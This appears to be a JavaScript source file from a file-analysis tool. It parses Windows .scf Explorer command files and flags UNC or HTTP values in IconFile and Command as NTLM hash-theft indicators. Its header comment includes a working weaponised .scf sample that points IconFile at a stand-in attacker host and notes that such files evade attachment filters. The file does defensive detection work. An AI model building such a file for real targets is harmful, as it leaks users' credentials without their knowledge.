'use strict';
// ════════════════════════════════════════════════════════════════════════════
// scf-renderer.js — Windows Explorer Command (.scf) shell-link analysis.
//
// `.scf` files are tiny INI-format Windows Explorer commands. The format
// has only a handful of keys (Command, IconFile, IconIndex, Author) but
// is weaponised for ATT&CK T1187 (Forced Authentication / NTLM hash
// theft) by setting `IconFile` to a UNC path:
//
//   [Shell]
//   Command=2
//   IconFile=\\attacker.example\share\icon.ico
//   IconIndex=1
//
// When Windows Explorer renders the folder it auto-resolves the icon,
// triggering an SMB authentication attempt to the attacker host —
// leaking the user's NTLMv2 hash without any user interaction. Same
// primitive as `.url` files with `IconFile=`, but `.scf` extensions
// have historically slipped past attachment filters that block `.url`.
//
// Detection scope:
//   • IconFile / Command pointing at a UNC path → high (T1187)
//   • IconFile / Command pointing at http(s) URL → medium (less reliable
//     credential leak, but still anomalous in a shell command file)
//   • Any pure-INI file using the [Shell] section
//
// Depends on: constants.js (IOC, escHtml, escalateRisk, lfNormalize, pushIOC)
// ════════════════════════════════════════════════════════════════════════════
class ScfRenderer {

  render(buffer, fileName) {
    const bytes = new Uint8Array(buffer instanceof ArrayBuffer ? buffer : buffer.buffer);
    const text = new TextDecoder('utf-8', { fatal: false }).decode(bytes);
    const wrap = document.createElement('div');
    wrap.className = 'scf-view';

    const banner = document.createElement('div');
    banner.className = 'doc-extraction-banner';
    const strong = document.createElement('strong');
    strong.textContent = '⚠ Windows Explorer Command (.scf)';
    banner.appendChild(strong);
    banner.appendChild(document.createTextNode(
      ' — INI-format shell command file. When IconFile points at a UNC ' +
      'path, opening the containing folder triggers SMB authentication ' +
      'to the attacker (T1187 Forced Authentication / NTLM hash theft).'
    ));
    wrap.appendChild(banner);

    const parsed = ScfRenderer._parseIni(text);
    const grid = document.createElement('div');
    grid.className = 'plaintext-info';
    const sections = Object.keys(parsed);
    grid.textContent = `${sections.length} section(s)  ·  ${this._fmtBytes(bytes.length)}  ·  SCF file`;
    wrap.appendChild(grid);

    // Build the parsed-keys card. We deliberately surface every key, not
    // just IconFile / Command, so the analyst can see the full INI body
    // alongside the raw view.
    if (sections.length) {
      const card = document.createElement('div');
      card.className = 'scf-card';
      for (const sec of sections) {
        const h = document.createElement('h4');
        h.textContent = `[${sec}]`;
        card.appendChild(h);
        const dl = document.createElement('dl');
        for (const [k, v] of Object.entries(parsed[sec])) {
          const dt = document.createElement('dt');
          dt.textContent = k;
          const dd = document.createElement('dd');
          dd.textContent = v;
          dl.appendChild(dt); dl.appendChild(dd);
        }
        card.appendChild(dl);
      }
      wrap.appendChild(card);
    }

    // Raw source view + click-to-focus plumbing.
    this._addRawView(wrap, text, bytes.length);
    return wrap;
  }

  analyzeForSecurity(buffer, fileName) {
    const bytes = new Uint8Array(buffer instanceof ArrayBuffer ? buffer : buffer.buffer);
    const text = new TextDecoder('utf-8', { fatal: false }).decode(bytes);
    const normalized = lfNormalize(text);

    // Standard initialiser; never pre-stamp risk above 'low' — the
    // calibration block at the end is what escalates based on evidence.
    const f = {
      risk: 'low', hasMacros: false, macroSize: 0, macroHash: '',
      autoExec: [], modules: [], externalRefs: [], metadata: {},
      signatureMatches: [],
    };

    // Format banner — always emit so the analyst sees an SCF was identified
    // even when no UNC payload is present (legitimate SCFs are extremely
    // rare in user-supplied files, so the format alone is suspicious).
    f.externalRefs.push({
      type: IOC.PATTERN,
      url: 'Windows Explorer Command (.scf) — text shell command, often weaponised for T1187 forced authentication',
      severity: 'medium',
    });

    // Key=Value scan for IconFile / Command. We intentionally don't
    // require the keys to live under [Shell]: malformed SCFs with the
    // keys at top-level still trigger Explorer's icon resolver.
    const keyRe = /^[ \t]*(IconFile|Command|IconIndex|Author)[ \t]*=[ \t]*(.+?)[ \t]*$/gim;
    let m;
    while ((m = keyRe.exec(normalized)) !== null) {
      const key = m[1];
      const val = m[2];
      const offset = m.index + m[0].indexOf(val);
      const length = val.length;

      // UNC path — primary T1187 vector. \\host\share or \\?\UNC\host\share.
      if (/^\\\\[^\\?][^\\]*\\/.test(val) || /^\\\\\?\\UNC\\/i.test(val)) {
        f.externalRefs.push({
          type: IOC.PATTERN,
          url: `${key} points at UNC path — T1187 forced authentication / NTLM hash leak`,
          severity: 'high',
          _highlightText: val,
          _sourceOffset: offset,
          _sourceLength: length,
        });
        pushIOC(f, {
          type: IOC.UNC_PATH,
          value: val,
          severity: 'high',
          note: `SCF ${key}`,
          highlightText: val,
        });
        continue;
      }

      // HTTP(S) URL — anomalous in a shell command file. Lower
      // confidence than UNC but still worth flagging.
      if (/^https?:\/\//i.test(val)) {
        f.externalRefs.push({
          type: IOC.PATTERN,
          url: `${key} points at HTTP URL — anomalous in a shell command file`,
          severity: 'medium',
          _highlightText: val,
          _sourceOffset: offset,
          _sourceLength: length,
        });
        pushIOC(f, {
          type: IOC.URL,
          value: val,
          severity: 'medium',
          note: `SCF ${key}`,
          highlightText: val,
        });
      }
    }

    // Evidence-based risk calibration — same shape as iqy-slk-renderer.
    const refs = f.externalRefs;
    const highs = refs.filter(r => r.severity === 'high').length;
    const hasCrit = refs.some(r => r.severity === 'critical');
    const hasMed = refs.some(r => r.severity === 'medium');
    if (hasCrit) escalateRisk(f, 'critical');
    else if (highs >= 1) escalateRisk(f, 'high');
    else if (hasMed) escalateRisk(f, 'medium');
    return f;
  }

  // ── Static parser — also exported for the test suite ─────────────────────
  // Minimal INI parser. SCFs are tiny (typically ≤ 200 bytes) so we don't
  // bother with continuation lines, escape sequences, or BOMs (Windows
  // Explorer doesn't honour them either).
  static _parseIni(text) {
    const out = {};
    let cur = '_';
    out[cur] = {};
    const normalized = lfNormalize(text);
    for (const rawLine of normalized.split('\n')) {
      const line = rawLine.trim();
      if (!line || line.startsWith(';') || line.startsWith('#')) continue;
      const sec = line.match(/^\[([^\]]+)\]$/);
      if (sec) {
        cur = sec[1].trim();
        if (!out[cur]) out[cur] = {};
        continue;
      }
      const kv = line.match(/^([^=]+?)\s*=\s*(.*)$/);
      if (kv) out[cur][kv[1].trim()] = kv[2];
    }
    // Drop the implicit pre-section bucket if it's empty.
    if (Object.keys(out._).length === 0) delete out._;
    return out;
  }

  // ── Render helpers ───────────────────────────────────────────────────────
  _addRawView(wrap, text, byteLen) {
    const normalizedText = lfNormalize(text);
    const lines = normalizedText.split('\n');

    const sourcePane = document.createElement('div');
    sourcePane.className = 'scf-source plaintext-scroll';

    const table = document.createElement('table');
    table.className = 'plaintext-table';
    const maxLines = RENDER_LIMITS.MAX_TEXT_LINES_SMALL;
    const count = Math.min(lines.length, maxLines);
    let highlightedLines = null;
    if (typeof hljs !== 'undefined' && normalizedText.length <= 200000) {
      try {
        const result = hljs.highlight(normalizedText, { language: 'ini', ignoreIllegals: true });
        highlightedLines = result.value.split('\n');
      } catch (_) { /* fallback to plain textContent */ }
    }
    for (let i = 0; i < count; i++) {
      const tr = document.createElement('tr');
      const tdNum = document.createElement('td');
      tdNum.className = 'plaintext-ln';
      tdNum.textContent = i + 1;
      const tdCode = document.createElement('td');
      tdCode.className = 'plaintext-code';
      if (highlightedLines && highlightedLines[i] !== undefined) {
        tdCode.innerHTML = highlightedLines[i] || '';
      } else {
        tdCode.textContent = lines[i];
      }
      tr.appendChild(tdNum); tr.appendChild(tdCode);
      table.appendChild(tr);
    }
    sourcePane.appendChild(table);
    wrap.appendChild(sourcePane);

    wrap._rawText = lfNormalize(text);
    wrap._showSourcePane = () => {
      sourcePane.scrollIntoView({ behavior: 'smooth', block: 'start' });
    };
  }

  _fmtBytes(n) {
    if (n < 1024) return n + ' B';
    if (n < 1048576) return (n / 1024).toFixed(1) + ' KB';
    return (n / 1048576).toFixed(1) + ' MB';
  }
}
